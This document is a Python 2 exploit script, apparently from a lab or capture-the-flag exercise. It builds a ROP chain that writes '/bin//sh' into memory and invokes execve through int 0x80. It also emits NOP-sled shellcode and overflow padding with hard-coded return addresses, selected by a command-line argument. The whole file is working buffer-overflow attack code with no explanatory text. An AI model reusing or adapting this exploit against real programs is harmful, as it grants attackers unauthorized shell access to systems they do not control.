#! python code
import sys
from shellcode import shellcode
#print 'argument' + sys.argv[1]

from struct import pack

# Padding goes here
# Padding goes here
p = ''

p += pack('<I', 0x080573ea) # pop edx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080c2406) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0808ea2d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080573ea) # pop edx ; ret
p += pack('<I', 0x080ef064) # @ .data + 4
p += pack('<I', 0x080c2406) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0808ea2d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080573ea) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x08051800) # xor eax, eax ; ret
p += pack('<I', 0x0808ea2d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481ec) # pop ebx ; ret
p += pack('<I', 0x080ef060) # @ .data
p += pack('<I', 0x080e3dc6) # pop ecx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x080573ea) # pop edx ; ret
p += pack('<I', 0x080ef068) # @ .data + 8
p += pack('<I', 0x08051800) # xor eax, eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x0809a5f6) # inc eax ; ret
p += pack('<I', 0x080495a9) # int 0x80

if sys.argv[1] == '1':
#	print "A"*32
#working#	print  pack('<I',0xeb819090)+ "\x90"*4 + shellcode
	print  pack('<I',0x909006EB)+ "\x90"*4 + shellcode #works as well with better jump command
#	print  pack('<I',0x909006EB)+ "\x90"*4 + p
#	print p
elif sys.argv[1] == '2':
#	print "B"*40 + pack('<I',0xbffee788) + pack('<I', 0x80f3720)
	print "B"*40 + pack('<I', 0x80f3720) +  pack('<I',0xbffee78c)
elif sys.argv[1] == '3':
#	print pack('<I',0x90909090) + shellcode
	print "C"*32
else:
	print "no option"
